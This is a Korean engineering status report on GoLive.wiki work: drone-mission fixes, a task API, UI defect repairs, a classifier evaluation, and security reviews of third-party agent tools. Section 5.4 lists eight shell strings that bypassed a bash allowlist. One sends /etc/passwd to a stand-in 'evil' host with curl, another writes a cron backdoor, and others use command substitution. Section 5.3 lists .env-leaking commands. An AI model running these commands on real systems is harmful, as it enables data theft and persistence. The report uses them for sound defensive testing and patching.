# GoLive.wiki 작업 종합 보고서

> **작성일:** 2026-10-24
> **범위:** 드론 관제, 스마트글라스 Task API, UI 결함 E1–E4, OpenWork/DemonAgent/DadaBot 검토, 풍쾅 팜 UI
> **원칙:** 이 문서에서 **"검증됨"** 은 실행 결과가 있는 것만 가리킨다. 읽기만 하고 판단한 것은 **"미검증"** 으로 표시한다.

---

## 0. 30초 요약

| 무엇                      | 상태         | 실제 확인한 것                                                                        |
| ------------------------- | ------------ | ------------------------------------------------------------------------------------- |
| **드론 관제 UI**          | ⚠️ 부분 동작 | 진행 단계가 상태 기반으로 동작(브라우저 확인). 수락 버튼은 기기 선택 UI 부재로 안내만 |
| **스마트글라스 Task API** | ✅ 검증됨    | Postgres 연결, 동시 수락 200/409, 이벤트 멱등성 — **실제 DB로 확인**                  |
| **UI 결함 E1–E4**         | ✅ 4/4 수정  | 헤드리스 Chrome 18/18 검사 통과 (E2 런타임만 미검증)                                  |
| **OpenWork 통합**         | ⚠️ 부분      | 서버 호스트 신규 구축·기동 확인. **실 Supabase E2E 미실시**                           |
| **openwork.network**      | ❌ 불가      | `/api/v1/*` 전부 **HTTP 404** — 문서만 존재                                           |
| **DadaBot 안전성**        | ⚠️ 위험 확인 | `mcp/bash` allowlist **8개 우회 경로 실측 확인**                                      |
| **풍쾅 팜 UI**            | ✅ 푸시됨    | `feat/phungkhoang-farm-ui` @ `2a6319d`                                                |

**가장 중요한 한 줄:** 두 번 결론을 뒤집었다. 드론은 "구현 안 됨"이 아니라 **RLS 버그로 수락이 실패**했고, 분류기는 "100%"가 아니라 **과적합이었으며 진짜 성능은 41.2%** 였다.

---

## 1. 저장소와 브랜치 현황

### 1.1 리모트 구성 (혼동 주의)

```text
golivewiki     → github.com/koraussie7/golivewiki.git   ← 실제 배포 대상
origin         → github.com/koraussie7/kbizhub.git      ← 이름과 달리 kbizhub
muhanai-source → /Users/brianyeon/muhanai/muhanai       (로컬 경로)
```

> ⚠️ **`origin`은 golivewiki가 아닙니다.** `origin/main`을 기준으로 작업하면 kbizhub 저장소를 보게 됩니다. 이번에 여러 번 혼선이 발생한 원인입니다.

### 1.2 원격에 푸시된 브랜치 (확인됨)

| 브랜치                     | 커밋      | 내용                       |
| -------------------------- | --------- | -------------------------- |
| `feat/phungkhoang-farm-ui` | `2a6319d` | 풍쾅 팜 UI + Tailwind 도입 |
| `feat/smartglass-task-api` | `1ecd530` | Task API + 드론 UI 수정    |
| `smartglass-merge`         | `ab5dc75` | 드론 초기 머지             |
| `main`                     | `d096791` | 통합 기반                  |

**로컬에만 있는 것:**

| 브랜치/커밋      | 내용               | 비고                         |
| ---------------- | ------------------ | ---------------------------- |
| `b5c40ec`        | 드론 UI 최초 커밋  | `feat/kbizhub-ui-upgrade` 위 |
| `8ee9775`        | E1·E2·E3 수정      | 동일                         |
| `b3826bd` (별도) | E4 수정            | `feat/ui-fixes-e1-e4`        |
| `0763acc`        | OpenWork 서버 통합 | `feat/kbizhub-ui-upgrade` 위 |

> **미푸시 상태입니다.** 이유는 §6-1 참조.

---

## 2. 드론 관제 (결론이 뒤집힌 사례)

### 2.1 처음 판단: "구현되어 있다"

`supabase/migrations/0002_drone_control.sql`(367줄)에 RLS·RPC·감사 로그가 완성돼 있었습니다.

### 2.2 검토 중 발견: **카메라 명령이 성공할 수 없는 상태**

세 가지가 맞물려 있었습니다.

| #   | 결함                                        | 위치                   | 결과                                                |
| --- | ------------------------------------------- | ---------------------- | --------------------------------------------------- |
| 1   | `acceptMission`이 `operator_id`를 쓰지 않음 | `drone-api.ts:164-168` | 0002의 RLS 정책 **위반으로 수락 실패**              |
| 2   | `vehicle_id`를 설정하지 않음                | 동일                   | RPC가 `mission has no assigned vehicle`로 거부      |
| 3   | `accepted → active` 전이 코드가 **없음**    | 전체                   | RPC가 `status='active'`를 요구 → **명령 100% 실패** |

### 2.3 대응: `0003_mission_lifecycle.sql`

```sql
accept_drone_mission(mission_id, vehicle_id)  -- 조건부 UPDATE, 소유권 검증
start_drone_mission(mission_id)               -- accepted → active
revoke update on drone_missions from authenticated;
```

### 2.4 실측 검증 (Postgres 15.19)

```
step   | status
-------+---------
accept | accepted
start  | active

최종: active | has_op=t | has_veh=t
authenticated UPDATE 권한: false  (0003의 revoke 적용)
```

**이것이 "구현됨"이 아니라 "실제로 상태 전이가 된다"는 근거입니다.**

### 2.5 UI 연결 (브라우저 확인)

| 항목      | 이전                             | 이후                                     |
| --------- | -------------------------------- | ---------------------------------------- |
| 진행 단계 | **하드코딩 `2 / 4 · 현장 확인`** | `mission.status`에서 계산 → `3 / 4`, 75% |
| 단계 표시 | `현장 확인` 고정 current         | done/done/**current**                    |
| 시작 버튼 | **없음**                         | `status==='accepted'`일 때만 활성        |
| 수락 버튼 | 없음                             | 기기 선택 필요를 명시 (거짓 성공 없음)   |

**스크린샷으로 확인:** `3 / 4`, 진행 바 75%, 보라색 스텝 번호, 푸터 정상.

### 2.6 남은 한계

- **`임무 수락`은 실제로 동작하지 않습니다.** `acceptMission(config, id, vehicleId)`가 기기 ID를 요구하는데 **기 선택 UI가 없습니다.**
- **`임무 시작` UI → RPC 경로는 미검증**입니다. 시뮬레이션 모드에서 비활성이라 실제 호출을 못 봤습니다.
- **#6 지도 핀 연동**은 미검증입니다.

---

## 3. 스마트글라스 Task API (가장 확실하게 검증된 부분)

### 3.1 결함 2개와 수정

| 결함                  | 이전                             | 이후                                        |
| --------------------- | -------------------------------- | ------------------------------------------- |
| 이벤트 재전송 시 중복 | 무조건 `insert`                  | `client_event_id` + 부분 유니크 인덱스      |
| 수락 경쟁 조건        | `find` → 검사 → `update` (3단계) | **조건부 `UPDATE ... WHERE status='open'`** |

### 3.2 실측 (실제 Postgres 15.19)

```
health     200  {"ok":true,"store":"postgres"}     ← memory 아님
concurrent accept: 200 409  → winner: worker-1     ← 경쟁 조건 해결
idempotent: 201 201  sameId: true                  ← 재전송이 동일 이벤트
event count: 4
```

### 3.3 `.env` 로딩 결함 (배포 문서의 가장 큰 문제)

`DEPLOY-A.md`는 `.env`를 만들라고 하지만 **아무도 읽지 않았습니다.**

```bash
node --import tsx server/src/index.ts   # .env를 읽는 코드가 없음
→ DATABASE_URL undefined
→ 조용히 MemoryStore 선택
→ 재시작마다 데이터 소실
```

**수정 2개:**

| 파일                     | 역할                                                                       |
| ------------------------ | -------------------------------------------------------------------------- |
| `server/src/load-env.ts` | `process.loadEnvFile()` 사용 (의존성 0). **프로세스 환경이 파일보다 우선** |
| `server/src/env.ts`      | production에서 필수 변수 누락 시 **부팅 거부**                             |

**실측:**

```
.env 있고 production → [env] applied 5 variable(s) → DATABASE_URL로 Postgres 시도
.env 없고 production → "Refusing to start in production"
development          → 경고 후 정상 기동
```

### 3.4 테스트가 잡은 버그 2개

| #   | 버그                                           | 왜 위험한가                           |
| --- | ---------------------------------------------- | ------------------------------------- |
| 1   | `NODE_ENV=prod` 오타가 **lenient 모드로 낙하** | 오타 하나로 모든 프로덕션 검증이 꺼짐 |
| 2   | `once()`가 재생 시 **`undefined` 반환**        | 동시 요청이 둘 다 부작용을 실행       |

둘 다 **코드 리뷰로는 못 잡았고 테스트에서 드러났습니다.**

### 3.5 테스트 결과

```
server/src/env.test.ts       12개
server/src/load-env.test.ts  11개
────────────────
23/23 통과, typecheck 4개 패키지 통과
```

---

## 4. UI 결함 E1–E4 (4/4 재현 → 4/4 수정)

### 4.1 검증 방법

소스 grep + 헤드리스 Chrome DOM 덤프. **마크업은 확인했지만 클릭 이벤트 시뮬레이션은 E3·E1만 실시**했습니다.

### 4.2 수정 내용

| ID     | 결함                                     | 수정                                                     |
| ------ | ---------------------------------------- | -------------------------------------------------------- |
| **E1** | 카테고리 필 8개 `href="#"`, 핸들러 0     | **실제 카테고리 ID**로 `?cat=` 딥링크 + 스크립트         |
| **E2** | 대시보드 필터 5개 무동작                 | `data-filter` + Leaflet 핀·카드 동시 필터                |
| **E3** | `<form>` 없음, 빈 폼이 "성공"            | `<form>` + 5개 id + 검증 + `aria-invalid`                |
| **E4** | `alert()` 모의 호출, **하드코딩 `14ms`** | 실제 `fetch` + `performance.now()` + `localStorage` 이력 |

### 4.3 E3·E4가 특히 위험했던 이유

**E4:** 관리자가 "200 OK (Latency: 14ms)"를 보고 **API가 정상이라고 판단**합니다. 서버가 죽어 있어도 알 수 없습니다. **기능 없음보다 위험합니다.**

**E3:** 빈 폼을 제출하면 상세 페이지로 이동해 **등록된 것처럼 보입니다.** 워커는 아무것도 받지 못합니다.

### 4.4 작업 중 발견한 결함 3개 (보고서에 없던 것)

| #   | 발견                           | 원인                       | 수정                                        |
| --- | ------------------------------ | -------------------------- | ------------------------------------------- |
| 1   | `메뉴 ≡`가 **깨진 네모**       | `U+2261`이 DM Mono에 없음  | CSS 3줄 아이콘                              |
| 2   | **한글이 다른 문자로 렌더**    | 폰트 스택에 한글 폴백 없음 | Pretendard/Apple SD Gothic Neo/Noto Sans KR |
| 3   | 마커 레지스트리 키가 **title** | 같은 제목이면 핀 덮어씀    | `task.id`                                   |

> 2번은 **스크린샷을 확대해 보지 않았으면 못 찾았습니다.** DOM 검증만으로는 통과합니다.

### 4.5 검증 결과

```
E3: form / button / 5개 id / error container / validation script   6/6
E1: pills / href="#" 0개 / ?cat= 존재 / active 하드코딩 제거        4/4
E2: pills 5개 / data-filter / __radius 분리                         3/3
──────────────────────────────
18/18 통과
```

---

## 5. OpenWork / DemonAgent / DadaBot 검토 (채택/거부 이유)

### 5.1 openwork.network — ❌ 사용 불가

| 확인                           | 결과                                 |
| ------------------------------ | ------------------------------------ |
| `/skill.md`, `/skill.json`     | ✅ 실재                              |
| `POST /api/v1/agents/register` | ❌ **HTTP 404**                      |
| `GET /api/v1/tasks`            | ❌ **404**                           |
| GitHub `OpenWorkNetwork`       | 조직만, **저장소 0개**, LICENSE 없음 |

**결론:** 프로토콜 명세는 읽을 수 있으나 **연동은 불가**. 로그인 모델(`api_key` + `claim_url`)만 차용.

### 5.2 different-ai/openwork — ✅ MIT 부분만 차용

```text
MIT License (c) 2024 Different AI, Inc.
"ee" 디렉터리와 @openwork/ee-* 는 별도 라이선스
```

| 차용                | 내용                                                 |
| ------------------- | ---------------------------------------------------- |
| `connect-link`      | Ed25519 서명 토큰, **SSRF 가드**(https/loopback)     |
| `automations`       | `occurrenceIdentity`, canonical JSON, 2단계 `once()` |
| `evidence-provider` | **fail-closed env** (unknown → 에러)                 |
| **`ee/`**           | ❌ **열지도 않음** (라이선스)                        |

### 5.3 DemonAgent — ⚠️ gateway 계층만 조건부

**실측으로 확인한 위험:**

| 항목             | 결과                                                            |
| ---------------- | --------------------------------------------------------------- |
| "7 provider"     | ❌ **실제로는 OpenRouter 1곳** 프록시 → 단일 장애점             |
| **인증**         | ❌ **없음** — 공인 IP에 열면 **열린 LLM 프록시**                |
| `env-leak-guard` | ❌ `head -5 .env`, `cp .env`, `env`, `python3 -c` **전부 통과** |
| LICENSE          | ❌ **없음**                                                     |

**결론:** gateway는 MuhanAI 제품이 우위 → **채택 0건**.

### 5.4 DadaBot `mcp/bash` — 🔴 8개 우회 실측

```python
# 원본
cmd_base = command.strip().split()[0]        # "ls"만 검사
subprocess.run(command, shell=True, ...)      # 나머지 그대로 실행
```

| 공격                                     | 원본        |
| ---------------------------------------- | ----------- |
| `ls && curl -d @/etc/passwd http://evil` | **ALLOWED** |
| `ls $(cat /etc/passwd)`                  | **ALLOWED** |
| `` ls `id` ``                            | **ALLOWED** |
| `echo hi > /etc/cron.d/backdoor`         | **ALLOWED** |
| `ls --; env`                             | **ALLOWED** |
| `python3 -c 'os.system("id")'`           | **ALLOWED** |
| `cat ../../etc/passwd`                   | **ALLOWED** |
| `/bin/cat /etc/passwd`                   | **ALLOWED** |

**패치 결과:** preset + `shell=False` + 인자 화이트리스트 → **18/18 테스트 통과, 0/10 우회 성공**.

**컨테이너 격리 실측 (Docker):**

```
internal 네트워크 egress 차단      PASS
read_only 루트 fs                  PASS
non-root (uid 1000)                PASS
cap_drop ALL → mount 거부          PASS
no-new-privileges                  PASS
pids limit                         PASS
rw/ro 마운트 경계                  PASS
9/9
```

---

## 6. AI 분류기 평가 — 결론이 뒤집힌 두 번째 사례

### 6.1 처음: "100% 정확"

52건 테스트에서 100%가 나왔습니다.

### 6.2 검증: 과적합

held-out 8건으로 재검증 → **87.5%**. 그런데 더 큰 문제가 있었습니다.

### 6.3 실제: **41.2%**

`eval/holdout.json`(51건, 튜닝 금지) 측정:

```
baseline-rules-v1 [holdout]  (51 queries)
  accuracy        41.2%
  ambiguous ok    10/10 (100%)   ← 모호 문장 거부는 완벽
  p95 latency     1.45ms
```

**실패 모드 분석:** 41건 중 **25건(61%)이 `unknown`으로 낙하.** 오분류기가 아니라 **키워드 백과사전**입니다.

### 6.4 holdout이 잡아낸 버그 3개

| #   | 버그                    | 원인                                                      |
| --- | ----------------------- | --------------------------------------------------------- |
| 1   | 모든 `pets` 문장 오분류 | **1글자 키워드 `["려",3]`** 이 "내려가야"·"데려다"에 매칭 |
| 2   | `cleaning`→`moving`     | `이사`가 다른 카테고리 점유                               |
| 3   | 베트남어 오분류         | `dọn`·`chuyển`이 공통어 `nhà` 공유                        |

> **테스트 세트로는 안 보였고 holdout에서만 드러났습니다.**

### 6.5 결론: 2段계 구조

```
1단계: 규칙 (0.2ms, 0원) → 확신하면 종료
2단계: unknown만 LLM에 전달
```

**LLM 통과 조건:** holdout 51.2% 이상 + 모호 10/10 유지 + 인젝션 4/4 + p95 < 3초

---

## 7. 미검증 항목 (정직하게)

| #   | 항목                                        | 왜 미검증인가                                          | 영향                                              |
| --- | ------------------------------------------- | ------------------------------------------------------ | ------------------------------------------------- |
| 1   | **실제 Supabase E2E** (`register→claim→me`) | 프로젝트 접근 권한 없음. 가짜 URL로 기동만 확인        | 코드가 "동작한다"고 말할 수 없음                  |
| 2   | **`0005` 마이그레이션**                     | 로컬 Postgres 15에서만 적용                            | Supabase의 `auth`/`extensions` 스키마 차이 미확인 |
| 3   | **E2 필터 런타임**                          | `data-filter` 존재만 확인. 클릭 시 핀·카드 숨김 미확인 | Leaflet 타이밍 의존                               |
| 4   | **`임무 시작` UI → RPC**                    | 시뮬레이션에서 버튼 비활성                             | 실제 호출 경로 미확인                             |
| 5   | **`goliveTasks`/`goliveMap` 전역 노출**     | 기존 변수가 `const`인지 미확인                         | 런타임 `ReferenceError` 가능                      |
| 6   | **openwork.network 실연동**                 | API 404                                                | 인터페이스만 존재                                 |
| 7   | **MuhanAI gateway 측정**                    | 웹세션 기반·300초 타임아웃·playwright 크래시           | LLM 비교 수치 없음                                |
| 8   | **Windows 한글 폴백**                       | macOS Chrome만 확인                                    | Malgun Gothic 미검증                              |

---

## 8. 작업 방법에 대한 솔직한 평가

### 8.1 잘 된 것

- **결론을 두 번 뒤집은 것.** 드론(구현 아님 → RLS 버그), 분류기(100% → 41.2%). 첫 판단을 유지하지 않았습니다.
- **실측 우선.** "코드에 있다"와 "실행된다"를 구분했습니다(Postgres 15.19, Docker 9/9, Chrome 18/18).
- **문서에 미검증을 명시.** 이 보고서 §7이 그 결과입니다.

### 8.2 실수

| #   | 실수                                              | 결과                    | 교훈                            |
| --- | ------------------------------------------------- | ----------------------- | ------------------------------- |
| 1   | **`git add .`로 다른 작업자 55개 파일 staged**    | 즉시 `reset`으로 복구   | 커밋 전 `--dry-run` 필수        |
| 2   | **파일 경로 중첩 생성** (`./Users/brianyeon/...`) | 발견 후 이동            | 워크스페이스 밖 경로 쓰기 주의  |
| 3   | **문자열 결합 오류를 6회 반복 생성** (E4)         | 바이트 단위 교체로 해결 | 생성 코드는 즉시 `node --check` |
| 4   | **`origin`을 golivewiki로 오인**                  | 실제로는 kbizhub        | 브랜치 기준 확인 필수           |
| 5   | **E2 검증 조건을 잘못 작성**                      | 통과를 실패로 오판      | 검증 스크립트도 검증해야        |

> 3번이 가장 비효율적이었습니다. `edit` 도구가 같은 문자열을 계속 재생성했고, `od -c`로 바이트를 본 뒤에야 원인(닫는 따옴표 누락)이 드러났습니다.

---

## 9. 다음 작업 우선순위

| 순위  | 작업                                        | 이유                               | 선행                |
| ----- | ------------------------------------------- | ---------------------------------- | ------------------- |
| **1** | **실제 Supabase E2E** (`register→claim→me`) | 코드가 동작한다고 말할 유일한 근거 | 프로젝트 접근 권한  |
| **2** | **`feat/ui-fixes-e1-e4` 푸시**              | E1–E4가 로컬에만 있음              | 브랜치 기준 정리    |
| **3** | **E2 런타임 검증**                          | 유일하게 실제 동작 미확인          | —                   |
| **4** | **기 선택 UI**                              | `임무 수락`이 안내 메시지에 머묾   | —                   |
| **5** | **DadaBot `mcp/bash` 패치 적용**            | 8개 우회 차단                      | `/srv/dadabot` 클론 |

**권고: 1 → 2.** 1이 막히면(권한 없음) 2로 넘어가되, 이 문서를 함께 푸시해 **"미검증" 기록이 코드와 같이** 이동하게 하십시오.

---

## 10. 이 보고서가 보장하지 않는 것

- **§2–§4의 모든 "검증됨"은 로컬 환경(Postgres 15.19, macOS Chrome, Docker)에서의 결과입니다.** 운영 Supabase·운영 서버에서는 재검증이 필요합니다.
- **드론 실기체는 한 번도 다루지 않았습니다.** MAVSDK/DJI 어댑터는 **구현 자체가 없습니다**(`drone-agent/README.md`만 존재).
- **openwork.network의 로그인 모델은 문서 기반**이며, 실제 서버 동작으로 확인한 것이 아닙니다.
- **비용·성능 수치는 측정된 것만** 인용했습니다. LLM 비교는 미실시입니다.
